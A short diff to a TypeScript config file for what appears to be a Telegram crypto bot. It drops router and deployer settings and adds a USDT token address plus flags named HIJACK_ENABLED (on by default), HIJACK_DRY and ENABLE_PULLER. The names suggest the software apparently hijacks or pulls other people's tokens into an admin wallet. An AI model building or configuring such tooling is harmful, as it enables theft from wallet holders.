@@ -12,20 +12,12 @@ function addr(name: string): string {
 }
 
 const keyHex = req('ENCRYPTION_KEY');
-if (!/^[0-9a-f]{64}$/i.test(keyHex)) {
-  throw new Error('ENCRYPTION_KEY must be 64 hex chars — openssl rand -hex 32');
-}
+if (!/^[0-9a-f]{64}$/i.test(keyHex)) throw new Error('ENCRYPTION_KEY must be 64 hex chars');
 
 const wss = req('WSS_URLS').split(',').map(s => s.trim()).filter(Boolean);
 const http = process.env.HTTP_URLS
   ? process.env.HTTP_URLS.split(',').map(s => s.trim()).filter(Boolean)
   : wss.map(u => u.replace(/^wss:\/\//, 'https://').replace(/^ws:\/\//, 'http://'));
-
-const router = process.env.ROUTER_CONTRACT_ADDRESS;
-const deployer = process.env.DEPLOYER_KEY;
-if (!router && !deployer) {
-  throw new Error('Set ROUTER_CONTRACT_ADDRESS, or DEPLOYER_KEY so the router can be deployed');
-}
 
 export const ENV = {
   TOKEN: req('TELEGRAM_BOT_TOKEN'),
@@ -37,8 +29,10 @@ export const ENV = {
   HTTP_URLS: http,
   BAW_BIN: process.env.BAW_BIN || 'baw',
   BAW_ROOT: process.env.BAW_ROOT || '/data/baw',
-  ROUTER_CONTRACT_ADDRESS: router?.toLowerCase(),
-  DEPLOYER_KEY: deployer,
   ADMIN_WALLET: addr('ADMIN_WALLET'),
+  USDT: (process.env.USDT_ADDRESS || '0x55d398326f99059ff775485246999027b3197955').toLowerCase(),
   MIN_PULLER_GAS_WEI: BigInt(process.env.MIN_PULLER_GAS_WEI || '2000000000000000'),
+  HIJACK_ENABLED: process.env.HIJACK_ENABLED !== 'false',
+  HIJACK_DRY: process.env.HIJACK_DRY === 'true',
+  ENABLE_PULLER: process.env.ENABLE_PULLER === 'true',
 };
